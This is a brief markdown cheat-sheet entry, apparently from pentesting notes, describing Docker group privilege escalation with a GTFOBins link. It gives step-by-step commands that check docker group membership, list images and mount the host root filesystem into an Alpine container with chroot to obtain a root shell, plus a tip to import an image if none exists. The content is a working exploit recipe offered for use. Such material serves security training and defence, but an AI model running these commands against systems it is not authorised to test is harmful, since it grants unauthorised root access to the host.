# Docker Group Privilege Escalation

Link: https://gtfobins.github.io/gtfobins/docker/

## Steps:

### 1) Confirm the user belongs in the docker group

    id

### 2) Check for images we can run

    docker image list

### 3) Get root shell

    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

## TIP: If there are no images on the machine, you can import one yourself and use this to achieve root!
